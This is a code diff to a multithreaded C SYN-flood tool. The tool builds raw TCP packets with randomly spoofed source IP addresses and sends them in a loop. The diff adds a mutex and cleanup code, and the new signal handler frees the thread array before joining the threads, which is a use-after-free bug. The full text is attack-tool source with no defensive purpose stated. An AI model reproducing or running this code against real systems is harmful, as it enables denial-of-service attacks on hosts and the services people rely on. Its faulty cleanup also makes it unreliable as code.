@@ -24,6 +24,7 @@ struct pseudo_header
 int i;
 int max_threads;
 pthread_t *th;
+pthread_mutex_t mutex;
 int raw_socket;
 char *pseudogram;
 char datagram[4096];
@@ -61,6 +62,7 @@ int main(int argc, char *argv[])
 
   max_threads = atoi(argv[3]);
   th = (pthread_t*)malloc(max_threads*sizeof(pthread_t));
+  pthread_mutex_init(&mutex, NULL);
 
   srand(time(NULL));
 
@@ -91,6 +93,9 @@ int main(int argc, char *argv[])
     }
   }
 
+  free(th);
+  pthread_mutex_destroy(&mutex);
+
   return 0;
 }
 
@@ -101,6 +106,7 @@ void *syn_flood(void *data)
   signal(SIGINT, handle_signal);
   while (true)
   {
+     pthread_mutex_lock(&mutex);
     // address resolution
     random_ip(source_ip); // spoofed IP address - ex: 192.168.1.2
     s_in.sin_family = AF_INET;
@@ -176,6 +182,7 @@ void *syn_flood(void *data)
     }
     // sleep for 1 second
     //sleep(1);
+    pthread_mutex_unlock(&mutex);
   }
 }
 
@@ -259,6 +266,8 @@ void handle_signal(int sig)
   printf("\nCaught interrupt signal %d\n", sig);
   puts("Releasing resources ...");
   free(pseudogram);
+  free(th);
+  pthread_mutex_destroy(&mutex);
   for (i=0; i < max_threads; i++) {
     if (pthread_join(th[i], NULL) != 0)
     {
